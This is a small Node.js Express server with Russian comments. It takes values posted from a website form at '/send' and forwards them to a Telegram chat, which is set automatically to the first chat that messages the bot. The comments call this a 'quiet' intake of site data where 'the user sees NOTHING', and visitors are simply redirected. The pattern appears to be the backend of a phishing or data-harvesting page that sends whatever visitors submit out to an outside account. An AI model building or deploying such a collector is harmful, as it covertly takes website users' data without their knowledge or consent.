const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const bodyParser = require('body-parser');

const app = express();
const bot = new TelegramBot(process.env.BOT_TOKEN, { polling: true });

let CHAT_ID = null;

app.use(bodyParser.urlencoded({ extended: false }));
app.use(express.static('public'));

// Бот сам запоминает chat_id
bot.on('message', (msg) => {
  if (!CHAT_ID) {
    CHAT_ID = msg.chat.id;
  }
});

// Тихий приём данных с сайта
app.post('/send', (req, res) => {
  const value = req.body.value;

  if (CHAT_ID && value) {
    bot.sendMessage(CHAT_ID, value);
  }

  // Пользователь НИЧЕГО не видит
  res.redirect('/');
});

const PORT = process.env.PORT || 3000;
app.listen(PORT);